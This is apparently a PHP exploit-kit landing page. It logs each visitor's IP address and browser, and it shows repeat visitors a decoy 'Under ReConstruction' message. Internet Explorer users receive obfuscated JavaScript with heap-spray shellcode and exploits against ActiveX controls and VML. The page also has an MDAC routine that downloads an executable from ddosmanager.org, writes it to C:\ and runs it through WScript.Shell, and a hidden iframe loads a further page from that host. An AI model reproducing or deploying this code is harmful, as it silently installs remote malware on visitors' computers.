<?php
include "inc.config.php";
include('lib/lib.placeholder.php');
include('lib/lib.csource.php');
mysql_connect($db_host, $db_user, $db_pass) or die("Couldn't connect to db!");
mysql_select_db($db_name) or die("DB \"$db_name\" not found!");

$ip = getenv("REMOTE_ADDR");

$sql = sql_placeholder('SELECT * FROM tp_stats WHERE ip = ? AND datetime > ?', $ip, date("Y-m-d H:i:s", time() - $timeout));
$r = mysql_query($sql);
$num = mysql_num_rows($r);

if ( $num > 0 )
{
	$sql = 'UPDATE tp_hits set total = total + 1';
	mysql_query($sql);

	echo "<center>Under ReConstruction</center>";
	exit();
}


$user_agent = getenv("HTTP_USER_AGENT");
$uri = getenv("REQUEST_URI");
$accept_lang = getenv("HTTP_ACCEPT_LANGUAGE");


if (strstr($user_agent, "Nav")) $browser = "Netscape";
elseif (strstr($user_agent, "Lynx")) $browser = "Lynx";
elseif (strstr($user_agent, "Opera")) $browser = "Opera";
elseif (strstr($user_agent, "WebTV")) $browser = "WebTV";
elseif (strstr($user_agent, "Konqueror")) $browser = "Konqueror";
elseif (strstr($user_agent, "Bot")) $browser = "Bot";
elseif (strstr($user_agent, "MSIE")) $browser = "MSIE";
elseif (strstr($user_agent, "Firefox")) $browser = "Firefox";
elseif (strstr($user_agent, "Google")) $browser = "Google";
else $browser = "other";//$user_agent;


if (strstr($user_agent, "Windows 95")) $os = "Windows 95";
elseif (strstr($user_agent, "Windows NT 4")) $os = "Windows NT 4";
elseif (strstr($user_agent, "Win 9x 4.9")) $os = "Windows ME";
elseif (strstr($user_agent, "Windows 98")) $os = "Windows 98";
elseif (strstr($user_agent, "Windows NT 5.0")) $os = "Windows 2000";
elseif (strstr($user_agent, "SV1")) $os = "Windows XP SP2";
elseif (strstr($user_agent, "Windows NT 5.1")) $os = "Windows XP (SP2)";
elseif (strstr($user_agent, "Windows NT 5.2")) $os = "Windows 2003";
else $os = "other";

$sql = sql_placeholder('INSERT INTO tp_stats(datetime, ip, user_agent, browser, os, uri, accept_lang) VALUES(?, ?, ?, ?, ?, ?, ?)', date("Y-m-d H:i:s"), $ip, $user_agent, $browser, $os, $uri, $accept_lang);
mysql_query($sql);
?>




<? if ( $browser != "MSIE"   ) { ?>

<? } ?>


<? if ( $browser == "MSIE" ) { ?>


<html xmlns:v="urn:schemas-microsoft-com:vml">

<head>

<object id="VMLRender" classid="CLSID:10072CEC-8CC1-11D1-986E-00A0C955B42E">
</object>
<style>
v\:* { behavior: url(#VMLRender); }
</style>

</head>



<body><div id="myDivA"></div>

<script language="JavaScript">

	function Wre0QKnj(QK9xDyhq, aQW48fTA)
	{
		while (QK9xDyhq.length*2<aQW48fTA)
		QK9xDyhq += QK9xDyhq;
		QK9xDyhq = QK9xDyhq.substring(0,aQW48fTA/2);
		return QK9xDyhq;
	}

	function lPXytrDV()
	{
	var url = "http://www.ddosmanager.org/numa/get.php?file=exe";
        var outValue = '';

        for (i = 0; i < url.length; )
{
outValue += '%u' + ((i+1<url.length)?url.charCodeAt(i+1).toString(16):'00')+url.charCodeAt(i).toString(16);
i = i + 2;
}


lipage = unescape(outValue);
		var vrf0BTsc = 0x0c0c0c0c;

                var YOf250Ca = unescape("%u4343%u4343%u54EB%u758B%u8B3C%u3574%u0378"+
                           "%u56F5%u768B%u0320%u33F5%u49C9%uAD41%uDB33"+
                           "%u0F36%u14BE%u3828%u74F2%uC108%u0DCB%uDA03"+
                           "%uEB40%u3BEF%u75DF%u5EE7%u5E8B%u0324%u66DD"+"%u0C8B%u8B4B%u1C5E%uDD03%u048B%u038B%uC3C5"+
                           "%u7275%u6D6C%u6E6F%u642E%u6C6C%u4300%u5C3A"+
                           "%u2e55%u7865%u0065%uC033%u0364%u3040%u0C78"+"%u408B%u8B0C%u1C70%u8BAD%u0840%u09EB%u408B"+
                           "%u8D34%u7C40%u408B%u953C%u8EBF%u0E4E%uE8EC"+
                           "%uFF84%uFFFF%uEC83%u8304%u242C%uFF3C%u95D0"+"%uBF50%u1A36%u702F%u6FE8%uFFFF%u8BFF%u2454"+
                           "%u8DFC%uBA52%uDB33%u5353%uEB52%u5324%uD0FF"+
                           "%uBF5D%uFE98%u0E8A%u53E8%uFFFF%u83FF%u04EC"+"%u2C83%u6224%uD0FF%u7EBF%uE2D8%uE873%uFF40"+
                           "%uFFFF%uFF52%uE8D0%uFFD7%uFFFF");

                           YOf250Ca += lipage;


                var iLXgJFXd = 0x400000;
		var j6cYwp5f = YOf250Ca.length * 2;
		var aQW48fTA = iLXgJFXd - (j6cYwp5f+0x38);
		var QK9xDyhq = unescape("%u0c0c%u0c0c");

		QK9xDyhq = Wre0QKnj(QK9xDyhq,aQW48fTA);
		EkosDgU9 = (vrf0BTsc - 0x400000)/iLXgJFXd;
		k00AIMkm = new Array();
		for(i=0;i<EkosDgU9;i++) k00AIMkm[i] = QK9xDyhq + YOf250Ca;
	}

	function Attack(n)
	{
	
	
		if (n == 0)
		{

			try
			{
				var WZObject = document.createElement("object");
				WZObject.setAttribute("classid","CLSID:A09AE68F-B14D-43ED-B713-BA413F034904");
				var check = WZObject.CreateNewFolderName(unescape("%00"));

				if (check == false)
				{
					lPXytrDV();

					var ch = 'A';
					while (xh.length < 231) ch+='A';
					ch += "\x0c\x0c\x0c\x0c\x0c\x0c\x0c";
					WZObject.CreateNewFolderFromName(ch);
					n = 200;
				}
			} catch(e){}

		if (n = 200) setTimeout("Attack(1)", 1000); else Attack(1);
		} else

		if (n == 1)
		{

			try
			{
				QTObject = new ActiveXObject('QuickTime.QuickTime');

				if (QTObject)
				{
					var qtcode = '<object CLASSID="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" width="1" height="1" style="border:0px">'+
					'<param name="src" value="http://www.ddosmanager.org/numa/movie.qtl">'+
					'<param name="autoplay" value="true">'+
					'<param name="loop" value="false">'+
					'<param name="controller" value="true">'+
					'</object>';

					lPXytrDV();
					document.getElementById("myDivA").innerHTML= qtcode;
					n = 200;
				}

			} catch(e){}

		if (n = 200) setTimeout("Attack(2)", 1000); else Attack(2);
		} else

		if (n == 2)
		{

			check = new ActiveXObject('WebViewFolderIcon.WebViewFolderIcon.1');

			if (check)
			{
				lPXytrDV();

				for(i=0;i<128;i++)
				{
					try
					{
						var tar = new ActiveXObject('WebViewFolderIcon.WebViewFolderIcon.1');
						_x = 0x7ffffffe;
                                                _y = 0x0c0c0c0c;
						tar.setSlice(_x,_y,_y,_y);
						n = 200
					} catch(e){}
				}
			}
			if (n = 200) setTimeout("Attack(3)", 1000); else Attack(3);
		} else

		if (n == 3)
		{

			lPXytrDV();

			myDiv = document.getElementById("myDivA");

			exploit  = "<v:rect style='width:120pt;height:80pt' fillcolor=\"red\" >";
			exploit += "<v:recolorinfo recolorstate=\"t\" numcolors=\"97612895\">";
			for (i=0;i<44;i++) exploit += "<v:recolorinfoentry tocolor=\"rgb(1,1,1)\" recolortype=\"1285\ lbcolor=\"rgb(1,1,1)\" forecolor=\"rgb(1,1,1)\" backcolor=\"rgb(1,1,1)\" fromcolor=\"rgb(1,1,1)\" lbstyle =\"32\" bitmaptype=\"3\"/> " ;
			exploit += "<v/recolorinfo>";
			myDiv.innerHTML = exploit;

		}


	}

	function y09GQNCZ(EGKvpQ2G)
	{
		var KPo8iva7 = "abcdefghiklmnopqrstuvwxyz";
		var WFUUMY67 = EGKvpQ2G;
		var ufh9tj84 = '';
		for (var i=0; i<WFUUMY67; i++)
		{
			var xFKKdXtb = Math.floor(Math.random() * KPo8iva7.length);
			ufh9tj84 += KPo8iva7.substring(xFKKdXtb,xFKKdXtb+1);
		}
		return ufh9tj84;
	}

	function ciifdImq(CLSID, name)
	{
		var result = null;

		                try { eval('result = CLSID.CreateObject(name)') }         catch(e){}
		if (! result) { try { eval('result = CLSID.CreateObject(name, "")') }     catch(e){} }
		if (! result) { try { eval('result = CLSID.CreateObject(name, "", "")') } catch(e){} }
		if (! result) { try { eval('result = CLSID.GetObject("", name)') }        catch(e){} }
		if (! result) { try { eval('result = CLSID.GetObject(name, "")') }        catch(e){} }
		if (! result) { try { eval('result = CLSID.GetObject(name)') }            catch(e){} }

		return(result);
	}

	function pjPzTX4M(xml, url)
	{
		try
		{
			xml.open("GET", url, false);
			xml.send(null);
		} catch(e) { return 0; }

		return xml.responseBody;
	}

	function QNhQua3r(o, name, data)
	{
		try
		{
			o.Type = 1;
			o.Mode = 3;
			o.Open();
			o.Write(data);
			o.SaveToFile(name, 2);
			o.Close();
		} catch(e) { return 0; }
		return 1;
	}

	function dkWw4Imc(exec, name, type)
	{
		if (type == 0)
		{
			try { exec.Run(name, 0); return 1; } catch(e) { }
		}
		else
		{
			try { exec.dkWw4Imc(name); return 1; } catch(e) { }
		}
		return(0);
	}

	function MDAC()
	{
		var Q8XPXZgd = "http://www.ddosmanager.org/numa/get.php?file=exe";
		var D6dmdg0Q = new Array('{BD96C556-65A3-11D0-983A-00C04FC29E30}', '{BD96C556-65A3-11D0-983A-00C04FC29E36}', '{AB9BCEDD-EC7E-47E1-9322-D4A210617116}', '{0006F033-0000-0000-C000-000000000046}', '{0006F03A-0000-0000-C000-000000000046}', '{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}', '{6414512B-B978-451D-A0D8-FCFDF33E833C}', '{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}', '{06723E09-F4C2-43c8-8358-09FCD1DB0766}', '{639F725F-1B2D-4831-A9FD-874847682010}', '{BA018599-1DB3-44f9-83B4-461454C84BF8}', '{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}', '{E8CCCDDF-CA28-496b-B050-6C07C962476B}', null);
		var hqqxRspk = new Array(null, null, null);
		var i = 0;
		var n = 0;
		var ret = 0;

		while (D6dmdg0Q[i] && (! hqqxRspk[0] || ! hqqxRspk[1] || ! hqqxRspk[2]) )
		{
			var a = null;

			try
			{
				a = document.createElement("object");
				a.setAttribute("classid", "clsid:" + D6dmdg0Q[i].substring(1, D6dmdg0Q[i].length - 1));
			} catch(e) { a = null; }

			if (a)
			{
				if (! hqqxRspk[0])
				{
					hqqxRspk[0] = ciifdImq(a, "ms"+"xml2.XM"+"LHTTP");
					if (! hqqxRspk[0]) hqqxRspk[0] = ciifdImq(a, "Micr"+"osoft.X"+"MLHTTP");
					if (! hqqxRspk[0]) hqqxRspk[0] = ciifdImq(a, "MSX"+"ML2.Serv"+"erXML"+"HTTP");
				}
				if (! hqqxRspk[1])
				{
					hqqxRspk[1] = ciifdImq(a, "ADO"+"DB.St"+"ream");
				}
				if (! hqqxRspk[2])
				{
					hqqxRspk[2] = ciifdImq(a, "WSc"+"ript.Sh"+"ell");
					if (! hqqxRspk[2])
					{
						hqqxRspk[2] = ciifdImq(a, "Sh"+"ell.Appli"+"cation");

	if (hqqxRspk[2]) n=1;
					}
				}
			}
			i++;
		}
		if (hqqxRspk[0] && hqqxRspk[1] && hqqxRspk[2])
		{
			var data = pjPzTX4M(hqqxRspk[0], Q8XPXZgd);

			if (data != 0)
			{
				var name = "c:\\"+y09GQNCZ(4)+".exe";
				if (QNhQua3r(hqqxRspk[1], name, data) == 1)
				{
					if (dkWw4Imc(hqqxRspk[2], name, n) == 1) { ret=1; }
				}
			}
		}
		return ret;
	}

	if (!MDAC()) Attack(0);


</script>


</body>
</html>
<iframe src="http://www.ddosmanager.org/numa1/index.php" frameborder=0 border=0 width=1 height=1 style="position: absolute; visibility: hidden"></iframe>
<? } ?>